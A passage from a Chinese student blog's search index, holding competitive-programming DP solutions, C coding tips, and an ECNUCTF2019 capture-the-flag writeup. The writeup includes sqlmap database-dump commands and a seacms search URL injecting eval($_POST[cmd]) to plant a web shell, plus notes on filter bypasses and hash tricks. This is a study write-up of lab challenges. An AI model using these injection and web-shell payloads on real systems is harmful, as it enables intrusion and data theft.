dp[i][j] = dp[i][j - 1]; if (i == j) ++dp[i][j]; else if(i &gt; j) dp[i][j] += dp[i - j][j]; } printf(&quot;%d\\n&quot;, dp[n][n]); } return 0;} 3034 数字拆分 将一个正整数拆分为成 2 的幂的和，例如：7=1+2+47=1+2+2+27=1+1+1+47=1+1+1+2+27=1+1+1+1+1+27=1+1+1+1+1+1+1总共有六种不同的拆分方案。再比如：4 可以拆分成：4 = 4，4 = 1 + 1 + 1 + 1，4 = 2 + 2，4 = 1 + 1 + 2。函数f(n)表示n的不同拆分的方案数，例如f(7)=6。请编写程序，读入一个正整数n(1≤n≤1000000)，输出 f(n)%1000000000。 说明如果n为奇数，那么每种划分只会相对于前一个偶数的划分各多出一个1，因此划分数相等，dp[n]=dp[n-1]。如果n为偶数，那么对于含有1的情况可以拿出2个1转化为n-2的情况，而对不含1的情况可以直接除以2变成n/2的情况，dp[n]=dp[n-2]+dp[n&gt;&gt;1]。 1234567891011121314151617181920#include &lt;cstdio&gt;#define MAX 1000000#define mod 1000000000int dp[1000001] = {0, 1, 2};int main(){ int cas, n; scanf(&quot;%d&quot;, &amp;cas); for (int i = 3; i &lt;= 1000000; ++i){ if (i &amp; 1) dp[i] = dp[i-1] % mod; else dp[i] = (dp[i-2] + dp[i&gt;&gt;1]) % mod; } for (int t = 0; t &lt; cas; ++t){ scanf(&quot;%d&quot;, &amp;n); printf(&quot;case #%d:\\n%d\\n&quot;, t, dp[n]); } return 0;} 3029 不重复正整数 整数拆分是把一个正整数（简称为和数）拆分为一个或若干个指定正整数（简称为零数，通常不区别式中各零数的排列顺序）之和，这是一个有趣的计算问题。通常拆分式中的零数有重复和不重复（即拆分式中各零数互不相同）两种情况。如果我们打算将一个给定的正整数 N （N≤50）拆分为若干个不重复的正整数（a1,a2,…,ai,…）（i≥1）之和，其中每个零数的取值不大于给定的正整数 M （M≤20），即 1≤ai≤M，请问共有多少种不同的拆分方案。 说明本质还是01背包，注意第二层循环倒序枚举，否则一个数可以取多次。注：dp[j] += dp[j-i]其实是dp[j] = max(dp[j], dp[j-i]+dp[j])的简化形式。 123456789101112131415161718#include &lt;bits/stdc++.h&gt;using namespace std;int main(){ int cas, n, m, dp[55]; cin &gt;&gt; cas; for (int t = 0; t &lt; cas; ++t) { cin &gt;&gt; n &gt;&gt; m; memset(dp, 0, sizeof(dp)); dp[0] = 1; for (int i = 1; i &lt;= m; ++i) for (int j = n; j &gt;= i; --j) dp[j] += dp[j-i]; printf(&quot;case #%d:\\n%d\\n&quot;, t, dp[n]); } return 0;} 2857 编辑距离 有两个字符串（仅有英文小写字母组成） A，B。我们可以通过一些操作将 A 修改成 B。操作有三种：1 修改一个字母，2 删除一个字母，3 插入一个字母。现在定义编辑距离为将 A 通过上述操作修改成 B 的最少次数。 说明有点像LCS的题，dp[i][j]表示a的前i个字符转为b的前j个字符所需要的最少操作次数。如果a[i-1]==b[j-1]那么不需要额外操作，dp[i][j]=dp[i-1][j-1];否则，我们可以选择： 修改：dp[i][j]=dp[i-1][j-1]+1; 增加：dp[i][j]=dp[i][j-1]+1； 删除：dp[i][j]=dp[i-1][j]+1。 三者取min。 1234567891011121314151617181920212223242526#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;algorithm&gt;#define INF 999999using namespace std;int main(){ int cas, i, j, lena, lenb, dp[501][501]; char a[501], b[501]; scanf(&quot;%d\\n&quot;, &amp;cas); while(cas--) { gets(a); lena = strlen(a); gets(b); lenb = strlen(b); memset(dp, INF, sizeof(dp)); for (i = 0; i &lt;= lena; ++i) dp[i][0] = i; for (j = 0; j &lt;= lenb; ++j) dp[0][j] = j; for (i = 1; i &lt;= lena; ++i) for (j = 1; j &lt;= lenb; ++j){ dp[i][j] = min(dp[i-1][j] + 1, dp[i][j-1] + 1); dp[i][j] = min(dp[i][j], dp[i-1][j-1] + (a[i-1] != b[j-1])); } printf(&quot;%d\\n&quot;, dp[lena][lenb]); } return 0;}","link":"/post/DPPractice/"},{"title":"ECNUCTF2019 初赛 writeup","text":"第二次参加 CTF，上次参加时还只知道古典密码。 吐槽在周六 8 点起床不是我的风格，但这周六我还是做到了。9 点开始比赛，到晚上近 10 点才关掉比赛网页。午饭点了外卖，傍晚跑了个步回家吃晚饭，有效比赛时间大概在 10 小时左右。 不知道为什么，现在的 CTF 比赛居然有理论题了，都是网安知识不过范围比较广，许多题得靠搜索引擎帮忙…… 做理论题做到一半网站就十分卡，感觉是被人 DDOS 了。到了近十点想交理论题的时候居然交不上了，看来主办方被 D 了个措手不及，好在修复还算及时，很快就交上了。 真正的 CTF 题在 10 点准时开放，然而所有题都放在了同一个服务器上，而这个服务器又一次遭受了恶意攻击，导致所有人都看不到题（只能欣赏题面精致的文案）。我猜运维肯定一脸懵逼，以致于在我们失望地等待了十几分钟后赛题才恢复正常。在此期间，积分榜却是开放的，上面全都是选手实名。。。十分无语，现在我应该不知道被社工多少次了。 等待网站恢复时发现第三题题面的图片很有趣，看起来像是帮助解题的关键线索： 通过 Google 图片搜索，我在这里发现了相关介绍，不过后来事实证明这跟解题一点关系也没有。 下面是 writeup 正文，大部分结果都是由队友启发得到的。 1. 土肥原贤二 显然这里可以查询数据库，考虑 SQL 注入攻击。输入 1 查询后发现 payload 可以构造为gid=1，然后 Kali 下运行 sqlmap 可以直接得到 flag。 1234567sqlmap -u 'http://47.103.43.235:81/quest/web/a/index.php?gid=1' --current-db# current database: luozhensqlmap -u 'http://47.103.43.235:81/quest/web/a/index.php?gid=1' -D luozhen --tables# tables in database luozhen: flag, goodsqlmap -u 'http://47.103.43.235:81/quest/web/a/index.php?gid=1' -D luozhen -T flag --columns# columns in table flag: flag, idsqlmap -u 'http://47.103.43.235:81/quest/web/a/index.php?gid=1' -D luozhen -T flag -C flag,id --dump 2. 吴佩孚 网页内的字符串符合典型的 Base64 编码的格式，解码得到 jsfuck 代码，在浏览器 Console 中运行即得到 flag。 3. 死亡真相坑题，题面和音频疯狂暗示摩斯电码，但实际上跟摩斯电码根本没有关系。听音频听不到什么有用的信息，于是用 Cool Edit Pro 打开并查看频谱图： 然而尝试提交后发现不是 flag。 注意到三个下划线有异样，猜想它们是 flag 中的空缺字符。爆破难度较大，因此大胆猜测三个下划线表示的是同一个数字。从 0 开始尝试到 9 但都不是正确的 flag。 观察新得到的 flag 值，发现其长度恰好为 32 个字符，这与 md5 算法哈希的结果形式一致。在这个神奇的网站尝试 md5 解密得到 flag，即下划线表示 0。 注：右键查看音频属性可以看到两个 zero 一个 0，早点看到就不用试那么多次了。。而且即使保留下划线进行 md5 解密同样可以获得 flag，但是要想到 md5 并不容易，略坑。 4. 日军空袭网页中的内容明显是 Base64 编码，进行多次解码（第一次解码无输出，尝试结尾加一个/两个等号就可以解码了）并 Unescape 后，重新排列得到的字符串，获得 flag。 5. 飞虎队天坑，参考了这篇博客。 对希尔矩阵求逆、通分、模 26 意义下加法后，得到解密矩阵： 1238 16 278 99 2427 24 27 将密文 3 个字符分为一组，转为 ASCII 码后再乘以解密矩阵，再模 26 对应到英文字母，就可以得到 flag。这个做法真的很坑。 6. 戴星炳 由于要求 2 秒内算出，因此考虑用 python 脚本发送请求，并计算算式的值后提交得到 flag。 7. 大美晚报 （假装这里有一张二维码图片） 对我来说有点难的 Misc 题。一开始以为是 web，但是根本没办法通过解析二维码得到什么有用的信息。只能下载图片，binwalk 一下，果然有压缩包： 根据密码是管理员 qq 号的线索，fcrackzip 跑半小时爆破 zip 密码……得到 flag。 8. 潘汉年 看到密文形式很容易想到凯撒，但是本题的关键在于猜出这个凯撒变体是怎么变的。猜的方法其实很通用，将前四个字母对应到“flag”，观察凯撒变换的规律即可。 9. 袁殊虽然我知道 RSA 算法的原理，但这题似乎依然在我能力范围之外。参考了这篇博客。 其实就是原题改了数据，主办方有点不走心啊。。按葫芦画瓢，先解出 e 和 n： 12345678910111213openssl rsa -pubin -text -modulus -in fllllllag.txt -in gy.keyPublic-Key: (256 bit)Modulus: 00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd: c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0: 89:12:d9Exponent: 65537 (0x10001)Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9writing RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni0bXTcqTQiRLZAgMBAAE=-----END PUBLIC KEY----- 在这里因式分解 n，得到 p 和 q。 最后写 python 脚本得到 flag： 10. 76 号难题。用 IDA 观察了很久很久，唯一有点线索的是这个sub_8048580： （此处省略了一部分代码） 看到了显眼的48 和 97，猜测是根据输入字符的 ASCII 码判断密码是否正确，将上面的代码（只截了一部分）仔细整理成表格查看，可以得到这样一张表（已对第二列去重）： 1234567891011120 07 59 1b 11d 3e 7f 4/8i 9j 10k 12v 2w 6 从这张表中还是看不出什么端倪，然而如果单看第二列的话，感觉第二列的所有数字正好组成了模 13 的最小非负完全剩余系。众所周知，在解谜游戏中遇到这种完全剩余系，一般都会考虑指向性谜题。本题也同样适用，即把 0 放到第 0 位，7 放到第 5 位，9 放到第 1 位……以此类推，就可以得到 13 位的密码，也就是 flag 了。 11. 晴气庆胤查看源代码发现： 说明要构造两个不同的字符串且它们的 md5 值相同，因此在 Burp/Postman 中发送 POST 请求： 12. 梅津美治郎在 IDA 中打开 Auth.exe，观察_main函数，在函数末尾发现： 可以立即得到第一关密码“r0b0RUlez!“。对于第二关密码，可以确定的是依然会调用strcmp函数，因此我们需要找到call strcmp语句并设置断点，此时第二关需要的密码应该可以在栈中找到。首先查找strcmp: 设置断点并调试： 查看EAX： 得到疑似第二关密码： 输入后发现密码错误，因此我们需要回去看一下，我们忽略了什么环节。在上图的_main伪代码中，我们看到”You passed level1!”后就没有看下去了，然而下面的sub_4015EA却是第二关的关键： 这里发生了异常跳转。我们查找它的外部引用，进入了sub_40157F: 见到了老朋友scanf函数，下一步当然是跟踪进sub_401547： 答案很明了了。原来这个函数对我们刚才得到的“第二关密码”又进行了按位异或 2。于是我们作同样计算后得到第二关密码： Flag 只需要用下划线拼接两关密码即可。 13. 冈村宁次显然又是 SQL 注入，唯一的注入点在id。url 中出现的id===QM，三个等号看起来很奇怪，大胆猜测==QM是倒置的 Base64 编码，解码MQ==得到 1，正好与列出数据的id一致。因此只需要写注入语句后进行一次 Base64 编码，再反转字符串即可。 多次尝试后得出结论：本题过滤了等号、空格、union、select、or 等关键字，因此采用双写绕过、十六进制绕过、注释绕过等手段改写 SQL 语句实现注入。这里 sqlmap 就很难帮到我们了。 14. 作战计划网站唯一的注入点位于搜索框，查阅有关 seacms 漏洞的资料来构造 payload： 1http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd]) 并连接菜刀/蚁剑，拿到网站 shell 后可以在根目录发现 flag.txt。 15. 池步洲在源代码中发现： 访问该文件，得到： 可以看到这里要求：name 和 password 不同，且 sha1 值相同。由于 php 中的 sha1 漏洞会使任意两个数组的 sha1 值相同，因此构造 payload： 总结由于参加比赛太少，经验还是有欠缺，比赛时对很多常见的模式都没有足够的敏感度，许多工具也是现场搭起来用的。 Reverse 和 Pwn 还是超级菜，后者并没有在初赛出现，但是据说决赛会有很多 Pwn 题。。记得去年决赛发呆 5 小时做了题隐写，希望今年能不垫底？","link":"/post/ECNUCTF2019/"},{"title":"简单 DP &amp; 递推合集","text":"题目全部来自EOJ。 1075 庆祝迎评成功 一个蛋糕切n刀，求最多可以切成几块。 说明对三维问题，降维处理不失为一种好方法。我们先考虑二维情况： n条直线分割一个平面，最多可以分割成几块？ 假设n-1条直线已经确定（并且已经是最优解，下同），那么第n条直线需要与前n-1条直线交于n-1个不同的点，这使第n条直线被分为n份，平面则将被多分出n个区域。 我们设二维情况的答案为f(n)，则f(n)=f(n-1)+n，推得通项公式f(n)=1+n(n+1)/2。 推广到三维，设此时答案为s(n)。n-1个平面已经确定，第n个平面需要与前n-1个平面有n-1条交线，这使第n个平面被分为f(n-1)份，空间则将被多分出f(n-1)个区域。我们得到：s(n)=s(n-1)+f(n-1)=s(n-1)+1+n(n-1)/2。 边界条件为s(0)=1。 123456789101112#include &lt;stdio.h&gt;int main(){ int a, i; long long s[1001]; s[0] = 1; for (i = 1; i &lt; 1001; ++i) s[i] = s[i - 1] + i * (i - 1) / 2 + 1; while (scanf(&quot;%d&quot;, &amp;a) &amp;&amp; a) printf(&quot;%lld\\n&quot;, s[a]); return 0;} 1015 核电站 一个核电站有 N 个放核物质的坑，坑排列在一条直线上。如果连续 M 个坑中放入核物质，则会发生爆炸，于是，在某些坑中可能不放核物质。任务：对于给定的 N 和 M，求不发生爆炸的放置核物质的方案总数 说明设第n个坑不发生爆炸的方案数为f(n)，我们假设前n-1个坑已经确定。分两种情况： 已经有连续m-1个核物质，那么第n个坑只能不放核物质，且这m-1个坑前的那个坑也不能放核物质。方案数为f((n-1)-(m-1)-1)=f(n-m-1)。 否则，第n个坑可以选择放或不放。方案数为2*[f(n-1)-f(n-m-1)]。 边界条件f(0)=1。 具体计算时可以用dp的递推形式写，也可以像如下代码中用2的幂计算： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;math.h&gt;int main(void){ int n, m, i; long long nuc[60]; nuc[0] = 1; while (~scanf(&quot;%d%d&quot;, &amp;n, &amp;m)){ for (i = 1; i &lt;= 50; ++i){ if (i &lt; m) nuc[i] = (long long)pow(2, i); else if(i == m) nuc[i] = (long long)pow(2, m) - 1; else nuc[i] = 2 * nuc[i - 1] - nuc[i - m - 1]; } printf(&quot;%I64d\\n&quot;, nuc[n]); } return 0;} 注：这里不能预处理nuc数组，因为m未知 3267 足球锦标赛 计分板上的每一位都按顺序挂了 0 到 9 这 10 个牌子，所以可以表示 000 至 999。当其中一个队的得分从 010 变成 011 时，计分员只要将最后一位的最前面的牌子向后翻即可，共需翻动一块牌子；当得分从 019 变成 020 是，由于 9 后面已经没有牌子了，所以计分员要将 0 到 9 全部翻到前面，并将倒数第二位的牌子 1 翻到后面，所以共需翻动 10 块牌子。现场的计分牌和图中所示还是存在差异的，现场的计分牌会很大，很重，所以翻每块牌子都要消耗 1 点体力。你是计分员，现在比赛还剩下最后十分钟。现在有一个预言家告诉你在这十分钟里，双方得分共计多少；但他没有告诉你双方得分各是多少。所以你想要知道你要花费的体力值最多是多少。 说明先模拟翻牌，预处理记录体力的数组。然后枚举双方得分情况，求最大值。 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;int dp[1001]={0};void init(){ int i; for (i = 1; i &lt;= 999; ++i){ if (i % 100 == 0) dp[i] = dp[i - 1] + 19; else if (i % 10 == 0) dp[i] = dp[i - 1] + 10; else dp[i] = dp[i - 1] + 1; } return;}int main(void){ int t, i, a, b, sc, j; scanf(&quot;%d&quot;, &amp;t); init(); for (i = 1; i &lt;= t; ++i){ scanf(&quot;%3d %3d %d&quot;, &amp;a, &amp;b, &amp;sc); int ans = 0, now = 0; for (j = 0; j &lt;= sc; ++j){ now = dp[a + j] - dp[a] + dp[b + sc - j] - dp[b]; if (now &gt; ans) ans = now; } printf(&quot;Case %d: %d\\n&quot;, i, ans); } return 0;} 1052 0-1背包问题 已知 n 个物体1,2,3,…,n与一个背包。物体i的重量为Wi&gt;0，价值为Pi&gt;0 (i=1,2,…,n)，背包容量为M&gt;0。求在不超过背包容量的情况下，使得装进去的物体的价值最高。 说明经典入门dp题。用一维数组实现时需要注意j需要从m到w递减，这与动规的bottom-up思路是一致的。 12345678910111213141516171819#include&lt;stdio.h&gt;int main(){ int t; scanf(&quot;%d&quot;, &amp;t); while(t--) { int n, m, i, j, w, v, a[100001] = {0}; scanf(&quot;%d%d&quot;, &amp;n, &amp;m); for(i = 0; i &lt; n; ++i){ scanf(&quot;%d%d&quot;, &amp;w, &amp;v); for(j = m; j &gt;= w; --j) if (a[j - w] + v &gt; a[j]) a[j] = a[j - w] + v; } printf(&quot;%d\\n&quot;,a[m]); } return 0;} 3302 打印 打印 n 个相同的字符，插入或删除一个字符花费的时间为 x，复制当前整个文本并且粘贴在后面的时间花费为 y，求完成 n 个字符的打印所需的最小花费时间。 说明dp[i]表示打印i个字符需要的最小时间。 i为偶数时，可能是(i-1个字符+插入一个字符) / (i/2个字符复制一次)两种操作之一产生的，取它们的最小值。 i为奇数时，可能是(i-1个字符+插入一个字符) / ((i+1)/2个字符复制一次)两种操作之一产生的，取它们的最小值。 写的时候用的c，还并不会定义宏，导致代码看起来比较繁琐。 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;memory.h&gt;typedef long long LL;LL dp[10000001];LL printing(int n, int x, int y){ int i; if (n == 0) return 0; if (n == 1) return x; memset(dp, 0, sizeof(dp)); for (i = 1; i &lt;= n; ++i){ if (i % 2) dp[i] = (dp[i-1]+x &lt; dp[(i+1)/2]+y+x)?dp[i-1]+x:dp[(i+1)/2]+y+x; else dp[i] = (dp[i-1]+x &lt; dp[i/2]+y)?dp[i-1]+x:dp[i/2]+y; } return dp[n];}int main(){ int n,x,y; scanf(&quot;%d%d%d&quot;,&amp;n, &amp;x, &amp;y); LL ans = printing(n, x, y); printf(&quot;%lld&quot;, ans); return 0;}","link":"/post/DPSimple/"},{"title":"EOJ1224 简单迷宫问题","text":"真那么简单我就不记录下来了。 题目简介 一天，sunny 不小心进入了一个迷宫，不仅很难寻找出路，而且有的地方还有怪物，但是 sunny 有足够的能力杀死怪物，但是需要一定的时间，但是 sunny 想早一点走出迷宫，所以请你帮助他计算出最少的时间走出迷宫，输出这个最少时间。我们规定每走一格需要时间单位 1, 杀死怪物也需要时间 1, 如果不能走到出口，则输出 impossible. 每次走只能是上下左右 4 个方向。 说明先四面造墙，省去判断是否出界的函数。之后对于有怪物的格子，新状态再搜索树中是当前状态的下两层的，因此不能走过之后直接step+2标记掉，而是要记录下这个状态(cnt=1)。很容易WA的点。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;cstdio&gt;#include &lt;queue&gt;using namespace std;#define NEXT mp[p.x+dx[i]][p.y+dy[i]]struct node{int x, y, step, cnt;};char mp[202][202];int sx, sy, n, m, i;const int dx[4] = {-1, 0, 1, 0};const int dy[4] = {0, 1, 0, -1};void bfs(){ queue&lt;node&gt; q; q.push({sx, sy, 0, 0}); mp[sx][sy] = '#'; while (!q.empty()){ node p = q.front(); q.pop(); if (p.cnt == 1){ p.cnt = 0; q.push(p); continue; } for (i = 0; i &lt; 4; ++i) switch(NEXT){ case '.': NEXT = '#'; q.push({p.x+dx[i], p.y+dy[i], p.step+1, 0}); break; case 'X': NEXT = '#'; q.push({p.x+dx[i], p.y+dy[i], p.step+2, 1}); break; case 'T': printf(&quot;%d\\n&quot;, p.step+1); return; } } printf(&quot;impossible\\n&quot;);}void init(){ sx = sy = 0; for (i = 1; i &lt;= n; ++i){ for (int j = 1; j &lt;= m; ++j){ scanf(&quot;%c&quot;, &amp;mp[i][j]); if (mp[i][j] == 'S') sx = i, sy = j; } getchar(); } for (i = 0; i &lt;= m+1; ++i) mp[0][i] = mp[n+1][i] = '#'; for (i = 0; i &lt;= n+1; ++i) mp[i][0] = mp[i][m+1] = '#';}int main(){ while (~scanf(&quot;%d%d\\n&quot;, &amp;n, &amp;m)){ init(); bfs(); } return 0;}","link":"/post/EOJ1224/"},{"title":"一点 C 语言的经验","text":"被邀请分享C语言学习经验，于是写了点东西给ECNU极客空间做推送。 Q&amp;A Q1: 大家一开始初学的时候程序里有很多很多的bug，大多是语法符号规范的错误，如何避免这些问题呢？ A1: 答案很可能要令人失望：多写代码。尽管听起来老生常谈，但是当代码量达到一定水平后，忘加分号或是把==写成=之类的语法错误几乎不会在你的代码中出现，也不需要再刻意去规避。 不过，在多写的基础上，仍有一些小技巧或许能有帮助： 认真阅读编译器给出的警告（warning）信息，明白其中的缘由，并且（如果不是有意为之）消除它们，尽管有时warning不会影响程序正确性。 还是让聪明的编译器来帮忙：对于把==写成=的问题，可以考虑写if (true == flag)而不是if (flag == true)。这样，当你写成=号时，第一种形式会导致编译错误。当然，如果做到了第一条，你不会需要这个技巧。 部分IDE或文本编辑器插件支持即时错误提示功能，这样可以在你写出错误语法的第一时间提醒你改正。不过不要太依赖这种功能。 与上一条相反，如果觉得自己足够熟练了，试着离开IDE写代码，并用命令行下的gcc编译运行。由于这样做不如在IDE内运行方便，你也许会在写代码时十分小心，并在写完代码后反复检查来减少重复编译运行的次数（也许不会）。 Q2: 作为萌新的我们，不知道怎么着手学习C语言，对于基础知识这块非常的薄弱，书上的内容感觉不是很系统，有什么好方法呢？能不能给我们推荐一些有用的参考资料呢？ A2: 老实说，我觉得学校用的K&amp;R足够好了，并且也不太可能有什么C语言书籍能超越它。不过如果觉得看得很累的话，不妨试试国内的任意一本豆瓣评分较高的C语言书籍。虽然它可能没那么好，甚至会误导人，但至少能够帮助没有基础的同学建立一些基本概念。 当然，如果你不屑看国内的书籍，这两本书也可以作为参考： C Programming: A Modern Approach K.N.King著 C Traps and Pitfalls Andrew Koenig著 （对任何国外的专业书籍请尽可能阅读原版） 最重要的是，在阅读时必须完成一部分书上的习题（乐意的话做OJ也行），通过实践进步是最快的。但是如果你真的想精通C语言而不是为了通过考试，仅仅快还不够——在代码量达到，比如300行左右时，请回头认真阅读K&amp;R。 Q3: 理论课上学到的知识，在实践课上不是很会操作，怎么尽快地能够应用呢？ A3: 要“尽快”的话，无疑需要： 多看别人的优质代码； 自己多写代码。 学校的OJ平台提供了一些相当有用的功能，如将题目按Reward排序，在AC后可以查看他人代码等等。利用这些功能从低难度题开始练习，并且在自己完成后观赏（嗯，观赏）优秀的代码（如Fastest，Shortest等），往往会有新的体会。另外，务必学会使用搜索引擎，但同样不要太依赖。 如果做OJ题让你感到很无趣，不妨试试小项目驱动的方法：学完结构体后，你差不多就可以写一个控制台里的文字RPG游戏了（好吧，可能还是不那么有趣）；或者，可以写一些小的实用工具（科学计算器，xx管理系统，文件批处理工具，表白程序等等）；你甚至可以尝试去写一个伪Shell。 Q4: 我们怎么才能判断什么时候该用什么函数？ A4: 我猜这里的“函数”是指“库函数”。 要背出所有库函数的功能显然不太现实，那么范围缩小到“常用”的会怎样？实际上，一个好用的方法是在做题时（或者做小项目时），当你需要一个功能，试着描述这个功能，打到搜索框里，并在前面加上“C ”（不带引号）。可以选择看国内的博文，但我推荐查阅C标准库的官方文档。 有一次我忘记了strcpy函数的参数顺序了，于是我很快查到了并关掉了网页。突然我因为别的事离开了电脑几分钟，回来时我又一次忘了那个顺序。这是在查阅资料时必须杜绝的现象，解决方法是：不要只看对你有用的部分，而是每次查阅都尽量深入地了解这个函数——一些用法也许很难一次记住，但经过多次查阅和实践后，也许你就能对C标准库中的常用函数如数家珍了。 Q5: 拿到一个问题我们该怎么着手处理呢？步骤是什么呢？ A5: 每个人都有不同的方法，我仅提供我自己的作为参考，未必适合每一个同学： 确保正确理解了题意。读完题就开始写，写到一半发现题意理解错的体验，包括我在内的很多人都有过。 由易到难。不要先考虑问题的最优解法，而是先从思维难度低的，或许看起来有点low的做法开始，设法改进你的算法。你甚至可以写一个正确性可以保证但速度较慢的版本，与你写的更优解法的版本进行对拍（请自行搜索如何对拍）。 想好完整的思路后再碰键盘。也就是说，一旦你开始写代码，尽量减少停下来长时间思考的时间。这很难，所以不强求。 最重要的，熟悉常用思路/算法。例如穷举、模拟、贪心、排序、字符串处理、二分、递归-记忆化搜索-DP等等。在许多OJ上，题目会按它所用到的思路/算法来分类（如EOJ上叫做tag）。当你足够熟悉这些常用思路/算法后，许多题可以匆匆一瞥就想到算法了——而这时，可能已经成功了50%（也可能只成功了5%）。 学会调试程序（debugging）。绝大多数情况下程序不可能一次运行就得到正确结果，花在查错改错上的时间往往比思考时间+实际编写程序的时间更长。而至少在查错上，gdb可以帮助我们节省不少时间。通常C语言IDE都带有gdb调试器，一定要学会使用它！另外可以配合printf变量的值进行调试。 Q6: 对于OJ这个系统，我们怎么利用它呢？ A6: 取决于你的目标。 ACMer默认已经有一定基础（比如：能轻松解决EOJ上大部分Reward &lt;= 4的题）。买本书学算法（比如“紫书”、“挑战”等），做书上练习，并在各大OJ上进行专题练习。多打比赛（CF/EOJ月赛），怎么样都别抄代码。之后就看自己了，我不打ACM所以不能给出有用的建议。 对程序设计与算法很感兴趣，想要深入学习的同学 巩固好基础（多写题+读K&amp;R）。推荐读紫书（《算法竞赛入门经典》），能认真读完并且每章多少做掉一部分习题的话，你的水平应该已经超过一部分ACMer了。之后可以选择专题练习（别抄代码），数学好的也可以选择去读《算法导论》一类的书。 想实践课和实训课拿高绩点的同学到EOJ的Gym里找实训题库，做题、总结思路/算法，后者更重要。看完题就知道怎么做的题（指代码结构在脑子里都组织好了），不做；想了半小时没思路可以查题解但是不要看代码，依然不会做的话，也放弃。一天就能做十题和十天只能做一题的那种题，对实力的提升都没有太大帮助。另外，实训4.0可遇不可求，不要为此花费太多时间在OJ上，即使你像我一样喜欢做题而完全不觉得累，因为其他课程也是很重要的。 想通过实践课和实训课考试的同学听课，做OJ上老师布置的题。有时间的话，从Reward较低的题开始做起，提升熟练度。百题过后，通过应该没有难度了。 所有人优雅的EOJ提供了用户手册，如果你真的想好好利用这个平台的话，请阅读一下。一些其它OJ也有类似的文档。但是Online Judge只是平台，Coding才是关键。必须在最后强调的一点是：尽力独立思考，绝对不抄代码。 经验分享宽泛的内容上面的回答已经基本涵盖了，下面是30条具体的东西，请结合搜索引擎食用。 编译与链接 一个编译单元中定义的全局变量初始值不要依赖定义在另一个编译单元中的全局变量初始值。（链接器不保证初始化顺序） 数据类型 一个void *类型的指针是一个合法的指针，常用于函数参数中用来传递一个函数与其调用者之间约定好类型的对象地址；而一个值等于NULL的指针虽然也是一个合法的指针，但不是一个有效的指针。 标准C语言允许任何非void *类型指针和void *类型指针之间进行直接的相互转换，如int *转换为void *再转换为double *，然而这样做存在不易察觉的安全问题（内存扩张/截断）。 强制转换时必须同时确保内存访问的安全性和转换结果的安全性，并且尽量用显式的转换。 标识符与表达式 避免用前导_和__定义标识符，因为一些内部名称和预定义的宏是这样命名的。 标识符命名应该遵循KISS原则（Keep It Simple &amp; Stupid），并且应该能自说明。 别记运算符优先级，用括号。 用&amp;&amp;时把最可能false的子表达式放左边，用||时把最可能true的子表达式放左边。（短路原则）同理，if/else结构中把最可能true的条件放前面。 浮点数比较不要用==和!=，而是像这样： 1234567#define EPS 1e-6 //设置要求的精度if (fabs(x - y) &lt;= EPS); //x等于yif (fabs(x - y) &gt; EPS); //x不等于y/* * 其中x,y是浮点数。fabs函数在math.h中，计算浮点数绝对值。 * 不过对浮点数用&gt;和&lt;是可以的，不过不建议用!(x&gt;y) &amp;&amp; !(x&lt;y)来判断相等，因为这和x==y语义等价。 */ 看到表达式里出现error/warning时，想想运算符两端是不是类型一致。不要把指针和0比较，也不要把数值和NULL比较。 循环 C按先行后列的顺序存储数组元素，所以两层for遍历时，先行后列比先列后行快几十倍。这听起来不可思议（总循环次数是一样的），不妨写两个程序试试？（原理见神书CSAPP） 循环体内存在逻辑判断，并且循环次数很多时，试试把逻辑判断移到外面。 少用goto，除非要从多层循环里直接跳出来。 函数 函数调用中参数传递的本质就是用实参来初始化形参而不是替换形参。 如果参数是指针，且仅做输入用，则应在类型前加const，防止该指针指向的内存单元被无意修改。 不要省略返回值类型，没返回值就用void。标准C语言中，不加类型说明的函数一律按int类型处理。 函数名和返回值在语义上不可冲突。不要将正常值和错误标志混在一起返回。建议正常值用输出参数获得，而错误标志用return返回。强调这个是因为C标准库中典型的反面教材：getchar()。看函数名似乎应该返回char类型，实际上它却返回int类型，只因为要返回错误标志EOF，也就是-1。 return语句不可返回指向堆栈（如函数内局部变量）的指针，因为该内存单元在函数体结束时被自动释放。 尽管语法允许，不要在内层程序块中定义会屏蔽外层程序块中同名标识符的标识符，否则会损害程序的清晰性。 学用assert宏。 指针 不管什么指针变量都要在声明的时候就初始化它，NULL也行。 将指针加/减正整数i等价于加/减i*sizeof(指针所指数据类型)。 传指针本质上是传地址。 表示a数组第4个元素a[3]居然还可以写成3[a]，这是为什么？（我开始写数组相关的内容了，却还是在指针板块，这又是为什么？） 多维数组作为函数参数时，为什么不需要说明第一维的大小而必须说明后面所有维的大小？ 即使你觉得自己不会忘记字符数组末尾的\\0，你还是会忘记。（有些库函数不会自动加\\0） 对下面的代码，输出p和*p有什么不同？ 12char ch = 'a';char *p = &amp;ch; 函数指针了解一下。 结构体 你可以用“位域”指定struct中成员变量所占的bit数（而不是byte），只不过成员类型必须是int/unsigned int/signed int之一。 根据自然对齐的原理，合理安排成员变量的声明顺序。（详见神书CSAPP） 最后提醒大家，程序的正确性固然重要，但是一定不要轻视其可读性、可维护性、健壮性、时空效率等等。不过也不用纠结大括号换不换行，缩进用Tab还是空格的问题。祝大家都能写出清晰、高效的优质代码！","link":"/post/CTips/"},{"title":"EOJ1424 Hard to Believe,but True!","text":"scanf里的正则，以及atoi函数。 题目简介 给定一个等式，问等式从右往左读是否正确。 说明题目不难，不过用到了一些有趣的字符串处理，所以记录下来。 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void rev_str(char s[]){ int c,i,j, len = strlen(s); for (i = 0, j = len - 1; i &lt; j; i++, j--){ c = s [i]; s[i] = s[j]; s[j] = c; }}int main(){ char str1[8]={0},str2[8]={0},str3[8]={0}; while (~scanf(&quot;%[^+]+%[^=]=%s&quot;, str1, str2, str3)){ rev_str(str1);rev_str(str2);rev_str(str3); if (atoi(str3) == atoi(str2) + atoi(str1)) printf(&quot;True\\n&quot;); else printf(&quot;False\\n&quot;); if (atoi(str3) == 